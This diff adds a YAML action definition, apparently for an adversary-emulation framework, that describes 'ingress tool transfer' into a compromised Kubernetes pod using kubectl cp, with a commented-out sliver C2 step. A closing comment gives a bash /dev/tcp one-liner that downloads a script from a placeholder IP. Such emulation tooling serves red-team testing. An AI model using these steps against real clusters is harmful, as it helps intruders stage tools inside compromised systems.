@@ -1,0 +1,39 @@
+id: upload-tool-or-file-via-k8s
+name: Upload Tool or File via k8s
+description: Transfer tools or other files from an external system into a compromised environment.
+tactic: Command And Control
+techniques: ["Ingress Tool Transfer"]
+parameters:
+  SRC_PATH:
+    type: string
+    description: Path to the file which will be transfered to the target system
+  DST_PATH:
+    type: string
+    description: Path on the target system where the file will be transfered
+  POD_NAME:
+    type: string
+    description: Name of the target pod
+  NAMESPACE:
+    type: Namespace
+    description: Kubernetes namespace of the target pod
+  Unpack:
+    type: bool
+    description: Flag if the file should be unpacked after transfer
+  # DST_DIR:
+  #   type: string
+  #   description: Path on the target system where the file will be transfered
+procedures:
+  - key: kubectl
+    command: kubectl cp -n ${NAMESPACE} ${SRC_PATH} ${POD_NAME}:${DST_PATH}
+    isLocal: true
+    precondition:
+      - "target.hasBinary(tar)"
+  # - key: sliver
+  #   command: get_file ${SRC_PATH}
+preconditions:
+  accessLevel: user-write
+  kind: Pod
+effects:
+  - "target.hasFile"
+#  try this onliner to download a file
+# bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /youfile.sh HTTP/1.1\r\nHost: ip\r\nConnection: close\r\n\r\n' >&3; cat <&3 > yourfile.sh"
